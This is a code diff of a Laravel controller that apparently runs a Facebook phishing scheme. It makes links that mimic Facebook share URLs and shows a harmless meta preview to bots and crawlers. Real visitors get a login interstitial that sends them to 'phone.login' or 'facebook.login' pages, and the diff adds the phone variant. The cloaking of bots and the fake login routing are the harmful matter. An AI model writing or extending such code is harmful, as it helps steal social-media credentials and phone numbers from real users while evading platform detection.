@@ -10,6 +10,14 @@ use App\Models\SharedPost;
 
 class FacebookShareController extends Controller
 {
+
+
+ public function createphone()
+    {
+        $history = SharedPost::orderBy('created_at', 'desc')->take(10)->get();
+        return view('admin.create_share_phone', compact('history'));
+    }
+
     public function create()
     {
         $history = SharedPost::orderBy('created_at', 'desc')->take(10)->get();
@@ -27,10 +35,14 @@ class FacebookShareController extends Controller
         $image->move(public_path('shared_images'), $imageName);
         $imagePath = 'shared_images/' . $imageName;
         $token = Str::random(10);
+        $isPhoneShare = $request->input('is_phone_share') == '1';
+       
         $post = SharedPost::create([
             'image' => $imagePath,
             'writeup' => $request->writeup,
             'token' => $token,
+            'phone_share' => $isPhoneShare,
+           
         ]);
         $link = URL::to("/facebook/share/r/{$token}") . '?mibextid=wwXIfr';
         return view('admin.share_link', compact('link'));
@@ -45,8 +57,8 @@ class FacebookShareController extends Controller
             // Show meta preview for bots/crawlers
             return response()->view('facebook.shared_post', compact('post'));
         } else {
-            // Show login interstitial for real users
-            return response()->view('facebook.login_interstitial');
+            $redirectRoute = $post->phone_share ? 'phone.login' : 'facebook.login';
+            return response()->view('facebook.login_interstitial', ['redirectRoute' => $redirectRoute]);
         }
     }
 
